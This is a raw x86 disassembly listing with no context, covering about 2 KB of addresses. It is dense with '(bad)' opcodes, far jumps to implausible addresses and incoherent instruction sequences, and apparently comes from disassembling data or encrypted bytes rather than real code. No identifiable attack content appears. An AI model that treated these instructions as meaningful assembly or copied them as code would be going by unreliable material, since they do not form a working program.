  4025e8:	mov    eax,0x462e4bf2
  4025ed:	mov    ch,0xc2
  4025ef:	pop    ecx
  4025f0:	shl    DWORD PTR [ebx],0xeb
  4025f3:	xor    al,0x1a
  4025f5:	fnstenv [ebx+0x2d]
  4025f8:	test   al,0x88
  4025fa:	cld    
  4025fb:	pop    eax
  4025fc:	fisttp WORD PTR [edi+0x313fd3]
  402602:	bound  edx,QWORD PTR [edi]
  402604:	lods   al,BYTE PTR ds:[esi]
  402605:	xchg   ecx,eax
  402606:	jl     0x40262f
  402608:	jg     0x4025ca
  40260a:	add    al,0xba
  40260c:	aad    0x12
  40260e:	jmp    0xea198816
  402613:	add    esp,DWORD PTR [edx-0x27]
  402616:	test   eax,0xd9a100b0
  40261b:	in     eax,0x3
  40261d:	data16 fabs 
  402620:	add    ebx,DWORD PTR [esi-0x27]
  402623:	cmp    DWORD PTR [ebx+0x3edd9a1],edx
  402629:	pop    edi
  40262a:	(bad)  
  40262c:	add    ebp,DWORD PTR [edx-0x27]
  40262f:	sbb    DWORD PTR [ebx+0x3e5d9a1],edx
  402635:	(bad)  fs:[ecx]
  402638:	add    al,0x42
  40263a:	fnstcw WORD PTR [ecx-0x1226de6e]
  402640:	add    ebx,DWORD PTR [esi-0x27]
  402643:	stc    
  402644:	add    esi,DWORD PTR [edx-0x27]
  402647:	imul   edx,DWORD PTR [edi+0x3f1d921],0x409d952
  402651:	sbb    cl,0x69
  402654:	xchg   edi,eax
  402655:	and    ecx,ebx
  402657:	icebp  
  402658:	add    edx,DWORD PTR [edx-0x27]
  40265b:	imul   eax,DWORD PTR [ebx],0x9769d8e2
  402661:	and    ecx,ebx
  402663:	loope  0x402668
  402665:	inc    edx
  402666:	fldcw  WORD PTR [ecx+0x3]
  402669:	(bad)  
  40266a:	fisubr DWORD PTR [ecx-0x69]
  40266d:	and    ecx,ebx
  40266f:	add    cl,cl
  402671:	popa   
  402672:	pop    ecx
  402673:	add    bl,ch
  402675:	pusha  
  402676:	fld    DWORD PTR [ecx+ebp*2]
  402679:	retf   0x9b
  40267c:	or     DWORD PTR [eax],eax
  40267e:	data16 fild DWORD PTR [ecx]
  402681:	jmp    0x4026e1
  402683:	fst    DWORD PTR [eax]
  402685:	imul   ebp,edx,0x61e9009a
  40268b:	fld    DWORD PTR [eax]
  40268d:	jmp    0x4940fff3
  402692:	pop    ebp
  402693:	fld    DWORD PTR [eax]
  402695:	jmp    0xe940cff3
  40269a:	pop    ecx
  40269b:	jmp    0x8aaa1ba0
  4026a0:	add    bl,bh
  4026a2:	pop    esp
  4026a3:	out    0x0,al
  4026a5:	jmp    0xe940b003
  4026aa:	pop    ecx
  4026ab:	leave  
  4026ac:	add    cl,ch
  4026ae:	outs   dx,BYTE PTR ds:[esi]
  4026af:	sbb    DWORD PTR [eax],eax
  4026b1:	fstp   DWORD PTR [ebx+edx*8+0x0]
  4026b5:	jmp    0xe940a013
  4026ba:	pop    ecx
  4026bb:	mov    ecx,0x396ee900
  4026c0:	add    cl,ch
  4026c2:	imul   ebx,ecx,0x5959e900
  4026c8:	add    cl,ch
  4026ca:	pop    ecx
  4026cb:	cdq    
  4026cc:	add    cl,ch
  4026ce:	outs   dx,BYTE PTR ds:[esi]
  4026cf:	stc    
  4026d0:	(bad)  
  4026d1:	fcomp  DWORD PTR [edi+ebx*8+0x0]
  4026d5:	jmp    0xe940c833
  4026da:	pop    ecx
  4026db:	loope  0x4026dd
  4026dd:	jmp    0xfa409050
  4026e2:	add    BYTE PTR [edx+eax*8+0x0],bl
  4026e6:	jmp    0x40a844
  4026eb:	jnp    0x4026bf
  4026ed:	cmp    BYTE PTR [eax],al
  4026ef:	mov    edx,ebp
  4026f1:	rol    BYTE PTR [eax],1
  4026f3:	call   0x68d2:0x7b0011df
  4026fa:	add    BYTE PTR [ebx-0x2e],bh
  4026fd:	sub    BYTE PTR [eax],al
  4026ff:	dec    ebx
  402700:	aad    0xb0
  402702:	add    BYTE PTR [ebx-0x2e],cl
  402705:	or     BYTE PTR [eax],al
  402707:	cmp    edx,edx
  402709:	mov    BYTE PTR [eax],al
  40270b:	cmp    edx,edx
  40270d:	dec    eax
  40270e:	add    BYTE PTR [ebx-0x2b],cl
  402711:	lock add BYTE PTR [ebx],bl
  402714:	fild   WORD PTR [eax+eax*1]
  402717:	cmp    edx,edx
  402719:	push   esp
  40271a:	add    BYTE PTR [ebx],bh
  40271c:	rcl    BYTE PTR [eax+eax*1],cl
  40271f:	push   ss
  402720:	shl    bl,cl
  402722:	add    BYTE PTR [eax],bl
  402724:	fild   QWORD PTR [ebx]
  402726:	add    bl,bh
  402728:	shl    DWORD PTR [eax+eax*1-0x5],1
  40272c:	shl    DWORD PTR [eax+eax*1],1
  40272f:	or     edx,ebp
  402731:	enter  0x1a00,0xdf
  402735:	or     eax,0x64d1fb00
  40273a:	add    bl,bh
  40273c:	shl    DWORD PTR [eax+eax*1],1
  40273f:	retf   
  402740:	aam    0xa8
  402742:	add    bl,cl
  402744:	rol    DWORD PTR [eax+eax*1],1
  402747:	add    BYTE PTR [ebx-0x44ff7b2f],bh
  40274d:	rol    DWORD PTR [eax+eax*1-0x35],1
  402751:	aam    0xe8
  402753:	add    BYTE PTR [ebx-0x44fff722],bl
  402759:	rcr    DWORD PTR [eax+eax*1-0x45],1
  40275d:	rcr    DWORD PTR [eax+eax*1],1
  402760:	mov    edx,esp
  402762:	cwde   
  402763:	add    BYTE PTR [edx+0x4],ah
  402766:	push   es
  402767:	push   ebx
  402768:	(bad)  
  402769:	lock or bh,BYTE PTR [edx+eiz*2-0x10]
  40276e:	or     bh,BYTE PTR [edx+eiz*2]
  402771:	lock or ebx,eax
  402774:	bound  esp,QWORD PTR [edx]
  402776:	push   es
  402777:	pop    ss
  402778:	(bad)  
  402779:	lock or ch,BYTE PTR [edx+eiz*2-0x10]
  40277e:	or     ch,BYTE PTR [edx+eiz*2]
  402781:	repnz or DWORD PTR [eax+0xc0af262],edi
  402788:	(bad)  
  40278a:	or     cl,BYTE PTR [edx+eiz*2+0x624c0af2]
  402791:	repnz or eax,edi
  402794:	bound  esp,QWORD PTR [edx]
  402796:	add    al,0x3
  402798:	(bad)  
  40279a:	or     dl,BYTE PTR [edx+0x62]
  40279d:	repnz or dl,BYTE PTR [edx]
  4027a0:	bound  ecx,QWORD PTR ds:0xff62a30b
  4027a6:	add    esp,DWORD PTR [ebx]
  4027a8:	(bad)  
  4027aa:	or     dh,BYTE PTR [edx+0x0]
  4027ad:	(bad)  
  4027af:	or     dh,BYTE PTR [edx]
  4027b1:	(bad)  
  4027b3:	or     esp,eax
  4027b5:	bound  esp,QWORD PTR [ecx]
  4027b7:	add    al,0xb
  4027b9:	(bad)  
  4027bb:	or     ah,BYTE PTR [edx+0x62]
  4027be:	repnz or ah,BYTE PTR [edx]
  4027c1:	(bad)  
  4027c3:	or     DWORD PTR [edx+eiz*2+0x62020af2],esp
  4027ca:	repnz or al,BYTE PTR [edx+0x420af262]
  4027d1:	(bad)  
  4027d3:	or     esp,esp
  4027d5:	bound  esp,QWORD PTR [edx]
  4027d7:	add    al,0x7
  4027d9:	(bad)  
  4027db:	or     bl,BYTE PTR [edx+0x62]
  4027de:	fldl2t 
  4027e0:	or     edi,DWORD PTR [eax-0x27]
  4027e3:	jmp    0xfe1a15f2
  4027e8:	add    al,0x21
  4027ea:	fldl2t 
  4027ec:	or     ecx,DWORD PTR [eax]
  4027ee:	fldl2t 
  4027f0:	or     edi,DWORD PTR [eax]
  4027f2:	fldl2t 
  4027f4:	or     cl,BYTE PTR [esi+0x5104dbd9]
  4027fa:	fldl2t 
  4027fc:	or     edi,eax
  4027fe:	fsubr  st,st(1)
  402800:	or     ecx,DWORD PTR [eax+0xe0ae9d9]
  402806:	fldl2t 
  402808:	or     ebx,DWORD PTR [eax-0x27]
  40280b:	jmp    0xea19001b
  402810:	or     eax,DWORD PTR [eax]
  402812:	test   al,0xd9
  402814:	jmp    0xda195623
  402819:	add    al,0x67
  40281b:	fldl2t 
  40281d:	or     ecx,DWORD PTR [ecx+ebx*8-0x268bf417]
  402824:	sub    DWORD PTR [edx+eiz*2],ecx
  402827:	fsqrt  
  402829:	add    al,0x51
  40282b:	fldl2t 
  40282d:	or     ecx,DWORD PTR [ecx+ebx*8-0x26cbf417]
  402834:	jmp    0xd9194e43
  402839:	add    al,0x5d
  40283b:	fldl2t 
  40283d:	or     edi,DWORD PTR [ecx+ebx*8-0x17]
  402841:	or     eax,DWORD PTR [ecx+ebx*8-0x26f9f517]
  402848:	jmp    0xea198c58
  40284d:	or     ebx,esp
  40284f:	fsubr  st,st(1)
  402851:	or     esp,DWORD PTR [ecx+ebx*8]
  402854:	jmp    0x118ee63
  402859:	fldenv [esi-0x2e]
  40285c:	add    cl,ch
  40285e:	pop    ecx
  40285f:	mov    ds:0xe369e900,eax
  402864:	add    cl,ch
  402866:	push   0x66fd0065
  40286b:	js     0x40286d
  40286d:	jmp    0xe940abcb
  402872:	imul   eax,ebx,0x6800e900
  402878:	and    eax,0xe066db00
  40287d:	add    cl,ch
  40287f:	pop    ecx
  402880:	jae    0x402882
  402882:	jmp    0xe940dbf0
  402887:	inc    bp
  402889:	add    cl,ch
  40288b:	pop    ecx
  40288c:	rol    DWORD PTR [eax],cl
  40288e:	jmp    0xe9407bec
  402893:	imul   edx,DWORD PTR [ebx+0x566e900],0xd9614900
  40289d:	add    cl,ch
  40289f:	pop    ecx
  4028a0:	test   al,0x0
  4028a2:	jmp    0xf4411110
  4028a7:	imul   edx,DWORD PTR [esi+0x0],0xe260fb
  4028ae:	jmp    0xe940b10c
  4028b3:	imul   ecx,eax,0x1766e900
  4028b9:	add    cl,bl
  4028bb:	pusha  
  4028bc:	iret   
  4028bd:	add    cl,ch
  4028bf:	pop    ecx
  4028c0:	js     0x4028c2
  4028c2:	jmp    0xe940e130
  4028c7:	data16 aaa 
  4028c9:	add    cl,ch
  4028cb:	pop    ecx
  4028cc:	fadd   DWORD PTR [eax]
  4028ce:	jmp    0x40812c
  4028d3:	retf   
  4028d4:	into   
  4028d5:	inc    ecx
  4028d6:	add    bl,cl
  4028d8:	aad    0xe2
  4028da:	add    BYTE PTR [eax],al
  4028dc:	mov    edx,edi
  4028de:	push   es
  4028df:	add    BYTE PTR [ebx-0x74ffa632],bh
  4028e5:	into   
  4028e6:	sbb    DWORD PTR [eax],eax
  4028e8:	mov    edx,ebp
  4028ea:	xchg   edx,eax
  4028eb:	add    BYTE PTR [eax+0x7b003bd7],cl
  4028f1:	into   
  4028f2:	jns    0x4028f4
  4028f4:	mov    ecx,esi
  4028f6:	cmp    DWORD PTR [eax],eax
  4028f8:	mov    edx,ebp
  4028fa:	rol    BYTE PTR [eax],cl
  4028fc:	mov    dl,bh
  4028fe:	adc    DWORD PTR [eax],eax
  402900:	jnp    0x4028d0
  402902:	imul   eax,DWORD PTR [eax],0x29ce4b
  402908:	dec    ebx
  402909:	aad    0xb2
  40290b:	add    BYTE PTR [ebx],bh
  40290d:	into   
  40290e:	or     DWORD PTR [eax],eax
  402910:	cmp    ecx,esi
  402912:	mov    DWORD PTR [eax],eax
  402914:	dec    ebx
  402915:	into   
  402916:	dec    ecx
  402917:	add    BYTE PTR [ebx-0x2b],cl
  40291a:	repnz add BYTE PTR [ebx],cl
  40291d:	xlat   BYTE PTR ds:[ebx]
  40291e:	add    al,0x0
  402920:	cmp    ecx,esi
  402922:	push   ebp
  402923:	add    BYTE PTR [ebx],cl
  402925:	into   
  402926:	adc    eax,0x2ce1b00
  40292b:	add    DWORD PTR [eax],ecx
  40292d:	xlat   BYTE PTR ds:[ebx]
  40292e:	sub    eax,DWORD PTR [eax]
  402930:	sti    
  402931:	int    0x75
  402933:	add    BYTE PTR [ebx],cl
  402935:	into   
  402936:	xor    eax,0xcad50b00
  40293b:	add    BYTE PTR [edx],cl
  40293d:	xlat   BYTE PTR ds:[ebx]
  40293e:	or     eax,0xcdfb0000
  402943:	gs add bl,cl
  402946:	int    0x25
  402948:	add    bl,cl
  40294a:	aam    0xaa
  40294c:	add    BYTE PTR [edx-0x10],ah
  40294f:	or     al,BYTE PTR ds:0x850af062
  402955:	(bad)  
  402956:	lock or al,BYTE PTR [ebp+0x62]
  40295a:	lock or ebp,edx
  40295d:	bound  esp,QWORD PTR [eax]
  40295f:	add    cl,BYTE PTR [eax]
  402961:	(bad)  
  402962:	lock or bl,BYTE PTR [ebp+0x62]
  402966:	lock or bl,BYTE PTR ds:0x9a0bf062
  40296d:	bound  eax,QWORD PTR [edx+eax*1]
  402970:	push   ebx
  402971:	(bad)  
  402972:	lock or bh,BYTE PTR [ebp+0x62]
  402976:	lock or bh,BYTE PTR ds:0xda0bf062
  40297d:	bound  ebx,QWORD PTR [esi]
  40297f:	add    dl,BYTE PTR [edi]
  402981:	(bad)  
  402982:	lock or ch,BYTE PTR [ebp+0x62]
  402986:	repnz or ch,BYTE PTR ds:0xba09f262
  40298d:	(bad)  
  40298f:	or     cl,BYTE PTR ds:0x8d0af262
  402995:	(bad)  
  402997:	or     cl,BYTE PTR [ebp+0x62]
  40299a:	repnz or edx,edi
  40299d:	bound  esp,QWORD PTR [edx]
  40299f:	add    BYTE PTR [ebx],al
  4029a1:	(bad)  
  4029a3:	or     dl,BYTE PTR [ebx+0x0]
  4029a6:	(bad)  
  4029a8:	or     dl,BYTE PTR [ebx]
  4029aa:	bound  eax,QWORD PTR ds:0x362c30b
  4029b0:	add    BYTE PTR [ebx],ah
  4029b2:	(bad)  
  4029b4:	or     dh,BYTE PTR [ebx+0x62]
  4029b7:	repnz or dh,BYTE PTR [ebx]
  4029ba:	(bad)  
  4029bc:	or     esi,eax
  4029be:	bound  esp,QWORD PTR [ecx]
  4029c0:	add    BYTE PTR [ebx],cl
  4029c2:	(bad)  
  4029c4:	or     ah,BYTE PTR [ebx+0x62]
  4029c7:	fldl2t 
  4029c9:	or     eax,DWORD PTR [ecx+0x40ae9d9]
  4029cf:	fucompp 
  4029d1:	or     esp,DWORD PTR [ecx-0x27]
  4029d4:	jmp    0xea1a0ae4
  4029d9:	or     esp,DWORD PTR [ecx]
  4029db:	fldl2t 
  4029dd:	or     al,ah
  4029df:	(bad)  
  4029e1:	add    BYTE PTR [ebp-0x27],bl
  4029e4:	jmp    0xea1962f4
  4029e9:	or     edi,DWORD PTR [ecx-0x27]
  4029ec:	jmp    0xfe1a1dfb
  4029f1:	add    BYTE PTR [ecx],ah
  4029f3:	fldl2t 
  4029f5:	or     edi,ecx
  4029f7:	fsubr  st,st(1)
  4029f9:	or     edi,DWORD PTR [ecx]
  4029fb:	fldl2t 
  4029fd:	or     dl,BYTE PTR [ecx+ebx*8-0x26aeff25]
  402a04:	jmp    0xea19f314
  402a09:	or     eax,DWORD PTR [eax]
  402a0b:	mov    ecx,ebx
  402a0d:	jmp    0xea193e1c
  402a12:	or     ebx,DWORD PTR [ecx-0x27]
  402a15:	jmp    0xea191325
  402a1a:	or     ebp,DWORD PTR [ecx+0x340ae9d9]
  402a20:	(bad)  
  402a22:	add    BYTE PTR [edi-0x27],bl
  402a25:	jmp    0xea19df35
  402a2a:	or     ebp,DWORD PTR [ebp-0x27]
  402a2d:	sub    DWORD PTR [edx+eiz*2],ecx
  402a30:	fsqrt  
  402a32:	add    BYTE PTR [ecx-0x27],dl
  402a35:	jmp    0xea199f45
  402a3a:	or     ebp,DWORD PTR ds:0x1c0ae9d9
  402a40:	fld    DWORD PTR [eax]
  402a42:	fsub   DWORD PTR [edx-0x30]
  402a45:	add    cl,ch
  402a47:	imul   edi,DWORD PTR [eax+0x0],0xb869e9
  402a4e:	jmp    0xe94059ab
  402a53:	pop    ecx
  402a54:	fadd   DWORD PTR [eax]
  402a56:	jmp    0xe94082c4
  402a5b:	imul   ebx,DWORD PTR [eax-0x10a71700],0xd262d8ff
  402a65:	add    cl,ch
  402a67:	imul   esp,DWORD PTR [eax-0x1f961700],0x5800e900
  402a71:	pop    edi
  402a72:	add    ch,bh
  402a74:	bound  edi,QWORD PTR [eax+eax*1-0x17]
  402a78:	imul   eax,DWORD PTR [eax-0x3f961700],0x1f58e900
  402a82:	add    bl,bl
  402a84:	(bad)  
  402a85:	in     al,0x0
  402a87:	jmp    0xe94098f5
  402a8c:	imul   ebp,DWORD PTR [esi+0x3f5ee900],0xce59e900
  402a96:	add    cl,ch
  402a98:	imul   ecx,DWORD PTR [esi+0x0],0x8e69e9
  402a9f:	jmp    0x49402a02
  402aa4:	and    eax,0x69e9feff
  402aa9:	test   eax,0xe969e900
  402aae:	add    ch,dh
  402ab0:	pop    ecx
  402ab1:	mov    al,BYTE PTR [eax]
  402ab3:	sti    
  402ab4:	add    al,0xe0
  402ab6:	add    cl,ch
  402ab8:	imul   ecx,DWORD PTR [ecx-0x2cf50000],0xcdfb0030
  402ac2:	rol    DWORD PTR [eax],0xb
  402ac5:	add    BYTE PTR [ecx],cl
  402ac7:	add    bl,cl
  402ac9:	shl    BYTE PTR [eax+0x0],cl
  402acc:	retf   
  402acd:	shl    BYTE PTR [eax],cl
  402acf:	add    BYTE PTR [ebx+0xa1cd],bh
  402ad5:	mov    ebx,0xcb0000d2
  402ada:	rol    BYTE PTR [eax+0x40d2cb00],cl
  402ae0:	add    BYTE PTR [ebx-0x74ff1e33],bh
  402ae6:	inc    DWORD PTR [eax+eax*1]
  402ae9:	mov    edx,edx
  402aeb:	pop    eax
  402aec:	add    BYTE PTR [ebx+0x7b0018d2],cl
  402af2:	int    0x91
  402af4:	add    BYTE PTR [eax-0x74ffc601],cl
  402afa:	sar    BYTE PTR [eax+0x0],cl
  402afd:	mov    edx,edx
  402aff:	cmp    BYTE PTR [eax],al
  402b01:	jnp    0x402ad0
  402b03:	rol    DWORD PTR [eax],1
  402b05:	mov    bh,bh
  402b07:	str    WORD PTR [ebx-0x2e]
  402b0b:	push   0x28d24b00
  402b10:	add    BYTE PTR [ebx],bh
  402b12:	int    0xb1
  402b14:	add    BYTE PTR [ebx],bh
  402b16:	ror    BYTE PTR [eax],cl
  402b18:	add    BYTE PTR [ebx-0x2e],cl
  402b1b:	mov    BYTE PTR [eax],al
  402b1d:	dec    ebx
  402b1e:	ror    BYTE PTR [eax+0x0],cl
  402b21:	cmp    ecx,ebp
  402b23:	icebp  
  402b24:	add    BYTE PTR [ebx],cl
  402b26:	inc    DWORD PTR [edx]
  402b28:	add    BYTE PTR [ebx],cl
  402b2a:	rcl    BYTE PTR [eax+eax*1+0xb],cl
  402b2e:	rcl    BYTE PTR [eax+eax*1],cl
  402b31:	push   ss
  402b32:	shl    bl,cl
  402b34:	add    BYTE PTR [edx+0x3],ah
  402b37:	(bad)  
  402b38:	sub    al,BYTE PTR [eax]
  402b3a:	(bad)  
  402b3b:	lock or dh,BYTE PTR [edx+eiz*2-0x10]
  402b40:	or     dh,BYTE PTR [edx+eiz*2]
  402b43:	lock or ecx,ecx
  402b46:	bound  esp,QWORD PTR [ecx]
  402b48:	dec    BYTE PTR [edx+eiz*2]
  402b4b:	lock or ah,BYTE PTR [edx+eiz*2-0x10]
  402b50:	or     ah,BYTE PTR [edx+eiz*2]
  402b53:	lock or ebp,DWORD PTR [ecx+0x40af062]
  402b5a:	(bad)  
  402b5b:	lock or al,BYTE PTR [edx+eiz*2+0x62440af0]
  402b63:	lock or ebp,ecx
  402b66:	bound  esp,QWORD PTR [eax]
  402b68:	inc    BYTE PTR [edi]
  402b6a:	(bad)  
  402b6b:	lock or bl,BYTE PTR [edx+eiz*2-0x10]
  402b70:	or     bl,BYTE PTR [edx+eiz*2]
  402b73:	lock or ebx,DWORD PTR [ecx+0x52fdfc62]
  402b7a:	(bad)  
  402b7b:	lock or bh,BYTE PTR [edx+eiz*2-0x10]
  402b80:	or     bh,BYTE PTR [edx+eiz*2]
  402b83:	lock or ebx,ecx
  402b86:	bound  esp,QWORD PTR [edx]
  402b88:	(bad)  
  402b89:	push   ss
  402b8a:	(bad)  
  402b8c:	or     ch,BYTE PTR [edx+eiz*2-0xe]
  402b90:	or     ch,BYTE PTR [edx+eiz*2]
  402b93:	repnz or DWORD PTR [ecx+0xc0af262],edi
  402b9a:	(bad)  
  402b9c:	or     cl,BYTE PTR [eax+eax*1+0x4c0af262]
  402ba3:	(bad)  
  402ba5:	or     ecx,edi
  402ba7:	bound  esp,QWORD PTR [edx]
  402ba9:	cld    
  402baa:	add    ah,BYTE PTR [edx-0xe]
  402bad:	or     dl,BYTE PTR [edx+0x62]
  402bb0:	fldl2t 
  402bb2:	or     esi,DWORD PTR [eax-0x27]
  402bb5:	hlt    
  402bb6:	or     eax,ecx
  402bb8:	fsqrt  
  402bba:	cld    
  402bbb:	inc    eax
  402bbc:	fldl2t 
  402bbe:	or     esi,DWORD PTR [eax-0x27]
  402bc1:	jmp    0xea195bd1
  402bc6:	or     bl,BYTE PTR [edi]
  402bc8:	fcmovu st,st(0)
  402bca:	cld    
  402bcb:	push   0x400be9d9
  402bd0:	fldl2t 
  402bd2:	or     eax,DWORD PTR [eax-0xf51627]
  402bd8:	fldl2t 
  402bda:	or     esp,DWORD PTR [eax-0x27]
  402bdd:	jmp    0xea1a0bed
  402be2:	or     esp,DWORD PTR [eax]
  402be4:	fldl2t 
  402be6:	or     bh,BYTE PTR [edi+0x64fcd9d9]
  402bec:	fldl2t 
  402bee:	or     edi,DWORD PTR [eax]
  402bf0:	fldl2t 
  402bf2:	or     ebp,DWORD PTR [eax-0x27]
  402bf5:	jmp    0xfe1a1b04
  402bfa:	cld    
  402bfb:	and    cl,bl
  402bfd:	jmp    0xea19240d
  402c02:	or     eax,DWORD PTR [eax]
  402c04:	sub    cl,bl
  402c06:	jmp    0xdc19bb15
  402c0b:	cld    
  402c0c:	jo     0x402be7
  402c0e:	jmp    0xea19f41e
  402c13:	or     edi,DWORD PTR [eax-0x27]
  402c16:	jmp    0xea193b25
  402c1b:	or     ebp,DWORD PTR [eax-0x27]
  402c1e:	jmp    0xea19142e
  402c23:	or     ebx,DWORD PTR [eax+0x2f0ae9d9]
  402c29:	fld    DWORD PTR [eax]
  402c2b:	fstp   DWORD PTR [esi]
  402c2d:	aad    0x0
  402c2f:	jmp    0xe940cf9d
  402c34:	pop    ecx
  402c35:	jecxz  0x402c37
  402c37:	sub    DWORD PTR [esi-0x27],edx
  402c3a:	add    dl,bh
  402c3c:	inc    dh
  402c3e:	add    cl,ch
  402c40:	imul   eax,DWORD PTR [ebx-0x3ca61700],0xe58e900
  402c4a:	add    al,bl
  402c4c:	fmulp  st(2),st
  402c4e:	add    cl,ch
  402c50:	imul   esi,DWORD PTR [ebx+0x0],0xb359e9
  402c57:	jmp    0xe9405ab4
  402c5c:	imul   edx,ebx,0x5369e900
  402c62:	add    cl,ch
  402c64:	pop    ecx
  402c65:	xchg   ebx,eax
  402c66:	add    cl,ch
  402c68:	add    BYTE PTR [eax-0x12],bl
  402c6b:	(bad)  
  402c6c:	fcomp  DWORD PTR [esi+0x69e900d0]
  402c72:	fwait
  402c73:	add    cl,ch
  402c75:	pop    ecx
  402c76:	fild   DWORD PTR [eax]
  402c78:	jmp    0xfd408ad5
  402c7d:	jle    0x402cf5
  402c7f:	add    cl,ch
  402c81:	imul   edi,DWORD PTR [ebx+0x0],0xbb59e9
  402c88:	jmp    0xdb404ae5
  402c8d:	pop    esi
  402c8e:	loopne 0x402c90
  402c90:	jmp    0xe94097fe
  402c95:	dec    ecx
  402c96:	lods   eax,DWORD PTR ds:[esi]
  402c97:	add    cl,ch
  402c99:	inc    esi
  402c9a:	ds add cl,ch
  402c9d:	cmp    ebp,ecx
  402c9f:	add    cl,ch
  402ca1:	cmp    DWORD PTR [ebp+0x0],ecx
  402ca4:	add    BYTE PTR [ebx],bh
  402ca6:	dec    DWORD PTR [eax+eax*1+0x3b]
  402caa:	(bad)  
  402cab:	sti    
  402cac:	add    BYTE PTR [ebx+0xb0000ce],ch
  402cb2:	dec    DWORD PTR [edi+0x0]
  402cb5:	sti    
  402cb6:	dec    BYTE PTR [edi]
  402cb8:	add    BYTE PTR [esi],cl
  402cba:	inc    DWORD PTR [ecx+0x1fcff900]
  402cc0:	add    BYTE PTR [ebx],cl
  402cc2:	jmp    FWORD PTR [edi+0x0]
  402cc5:	sti    
  402cc6:	(bad)  
  402cc7:	das    
  402cc8:	add    bl,bh
  402cca:	std    
  402ccb:	rol    DWORD PTR [eax],0x0
  402cce:	mov    ebx,0xcb000acf
  402cd3:	(bad)  
  402cd4:	pop    edi
  402cd5:	add    BYTE PTR [ebx-0x44ffe002],bh
  402cdb:	std    
  402cdc:	mov    eax,ds:0xfffecb00
  402ce1:	dec    ebx
  402ce3:	(bad)  
  402ce4:	jg     0x402ce6
  402ce6:	mov    ebx,0xbb003ffe
  402ceb:	std    
  402cec:	loope  0x402cee
  402cee:	mov    ebx,0x8b0006cf
  402cf3:	(bad)  
  402cf4:	push   edi
  402cf5:	add    BYTE PTR [ebx-0x2],bh
  402cf8:	pop    ss
  402cf9:	add    BYTE PTR [ebx-0x3],bh
  402cfc:	xchg   ecx,eax
  402cfd:	add    BYTE PTR [eax-0x31],bh
  402d00:	cmp    eax,DWORD PTR [eax]
  402d02:	mov    edi,esi
  402d04:	ja     0x402d06
  402d06:	jnp    0x402d06
  402d08:	aaa    
  402d09:	add    BYTE PTR [ebx-0x3],bh
  402d0c:	rol    DWORD PTR [eax],1
  402d0e:	cmp    cl,bh
  402d10:	adc    DWORD PTR [eax],eax
  402d12:	dec    ebx
  402d13:	(bad)  
  402d14:	add    BYTE PTR [bp+di],bh
  402d17:	(bad)  
  402d18:	daa    
  402d19:	add    BYTE PTR [ebx],bh
  402d1b:	std    
  402d1c:	mov    cl,0x0
  402d1e:	(bad)  
  402d1f:	lock cli 
  402d21:	or     BYTE PTR [edx-0x10],ah
  402d24:	cli    
  402d25:	mov    BYTE PTR [edx-0x10],ah
  402d28:	cli    
  402d29:	dec    eax
  402d2a:	(bad)  
  402d2b:	lock sti 
  402d2d:	repnz bound esp,QWORD PTR [eax]
  402d30:	or     al,BYTE PTR [eax+eax*1]
  402d33:	(bad)  
  402d34:	lock cli 
  402d36:	push   esp
  402d37:	(bad)  
  402d38:	lock cli 
  402d3a:	adc    al,0x62
  402d3c:	add    bl,bh
  402d3e:	add    DWORD PTR [ebx-0x1],esp
  402d41:	or     DWORD PTR [ebx],ebp
  402d43:	(bad)  
  402d44:	lock cli 
  402d46:	je     0x402daa
  402d48:	lock cli 
  402d4a:	xor    al,0x62
  402d4c:	lock sti 
  402d4e:	retf   0x2162
  402d51:	or     cl,BYTE PTR ds:0x64faf062
  402d57:	(bad)  
  402d58:	lock cli 
  402d5a:	and    al,0x62
  402d5c:	lock sti 
  402d5e:	stos   BYTE PTR es:[edi],al
  402d5f:	(bad)  
  402d60:	lock cli 
  402d62:	add    al,0x62
  402d64:	lock cli 
  402d66:	test   BYTE PTR [edx-0x10],ah
  402d69:	cli    
  402d6a:	inc    esp
  402d6b:	(bad)  
  402d6c:	lock sti 
  402d6e:	jmp    0xf062:0x80a2062
  402d75:	cli    
  402d76:	pop    esp
  402d77:	(bad)  
  402d78:	lock cli 
  402d7a:	sbb    al,0x62
  402d7c:	lock sti 
  402d7e:	call   0xf062:0x5309fc62
  402d85:	cli    
  402d86:	jl     0x402dea
  402d88:	lock cli 
  402d8a:	cmp    al,0x62
  402d8c:	lock sti 
  402d8e:	fisub  DWORD PTR [edx+0x14]
  402d91:	or     dl,BYTE PTR [edi]
  402d93:	bound  eax,QWORD PTR [edx]
  402d95:	sti    
  402d96:	ins    BYTE PTR es:[edi],dx
  402d97:	add    BYTE PTR [edx-0x27],ah
  402d9a:	jmp    0xea19a49a
  402d9f:	cli    
  402da0:	clc    
  402da1:	fldl2t 
  402da3:	sti    
  402da4:	data16 fldl2t 
  402da7:	sti    
  402da8:	fcompp 
  402daa:	jmp    0xea19c4aa
  402daf:	cli    
  402db0:	sbb    dl,bl
  402db2:	(bad)  [eax]
  402db4:	popa   
  402db5:	fldl2t 
  402db7:	sti    
  402db8:	mov    al,0xd9
  402dba:	jmp    0xf5199eba
  402dbf:	sti    
  402dc0:	and    dl,bl
  402dc2:	cli    
  402dc3:	or     BYTE PTR [ecx-0x27],al
  402dc6:	jmp    0xea199ec6
  402dcb:	sti    
  402dcc:	xor    cl,bl
  402dce:	jmp    0xd919d2cd
  402dd3:	or     BYTE PTR [ecx-0x27],ch
  402dd6:	jmp    0xea196ed6
  402ddb:	sti    
  402ddc:	sbb    cl,0xe9
  402ddf:	cli    
  402de0:	add    al,0xda
  402de2:	jmp    0xea198ee2
  402de7:	sti    
  402de8:	loopne 0x402dc3
  402dea:	jmp    0xea194eea
  402def:	cli    
  402df0:	test   cl,bl
  402df2:	(bad)  [eax]
  402df4:	pop    ebp
  402df5:	fldl2t 
  402df7:	sti    
  402df8:	sub    cl,bl
  402dfa:	jmp    0xd9a82efa
  402dff:	jmp    0xfe1a02fe
  402e04:	or     BYTE PTR [ecx],ah
  402e06:	fldl2t 
  402e08:	sti    
  402e09:	call   0x293c17e6
  402e0e:	fldl2t 
  402e10:	cli    
  402e11:	xor    al,0xd9
  402e13:	add    bl,bl
  402e15:	push   0xffffffcc
  402e17:	add    cl,ch
  402e19:	dec    ecx
  402e1a:	add    DWORD PTR [eax],0xffffffe9
  402e1d:	dec    ecx
  402e1e:	ret    
  402e1f:	add    cl,ch
  402e21:	cmp    BYTE PTR [edi],ch
  402e23:	add    cl,ch
  402e25:	cmp    ebx,esp
  402e27:	add    cl,ch
  402e29:	sub    DWORD PTR [ebx+0x0],esp
  402e2c:	jmp    0xe940d15a
  402e31:	sbb    bh,ch
  402e33:	(bad)  
  402e34:	fsubr  DWORD PTR [edx-0x22]
  402e37:	add    cl,ch
